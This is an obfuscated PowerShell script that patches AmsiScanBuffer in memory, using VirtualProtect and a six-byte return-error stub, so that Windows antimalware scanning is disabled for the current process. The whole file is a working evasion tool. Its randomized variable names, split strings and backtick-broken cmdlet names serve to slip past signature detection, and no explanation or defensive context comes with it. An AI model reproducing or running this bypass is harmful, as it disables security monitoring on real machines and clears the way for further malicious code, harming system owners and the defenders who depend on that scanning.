function Get-FunctionBaseAddress {
    Param ($MuddleTub, $VulgarDelay)
    $KickPowder = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $PowderMan = $KickPowder.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
    $CauseCurly = $PowderMan[0].Invoke($null, ($KickPowder.GetMethod('GetModuleHandle').Invoke($null,@($MuddleTub)), $VulgarDelay))
    return $CauseCurly
}
function Get-DelegateType {
    Param ([Type[]] $FarmSpotty, [Type] $TrickFull = [Void] )
    $MatureKick = [AppDomain]::CurrentDomain.DefineDynamicAssembly((ne`w`-`ob`ject System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $MatureKick.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $FarmSpotty).SetImplementationFlags('Runtime, Managed')
    $MatureKick.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $TrickFull, $FarmSpotty).SetImplementationFlags('Runtime, Managed')
    return $MatureKick.CreateType()
}
$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[IntPtr]$StuffTrust = Get-FunctionBaseAddress -MuddleTub ("am"+"si.dll") -VulgarDelay ("Amsi"+"Scan"+"Buffer")
$SuperStale = 0
[IntPtr] $AmountQuaint = Get-FunctionBaseAddress -MuddleTub ("kern"+"el32.dll") -VulgarDelay ("Virtual"+"Protect")
$CombListen = Get-DelegateType -FarmSpotty @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -TrickFull ([Bool])
$WheelNosy=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AmountQuaint, $CombListen)
$WheelNosy.Invoke($StuffTrust, [uint32]5, 0x40, [ref]$SuperStale)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $StuffTrust, 6)

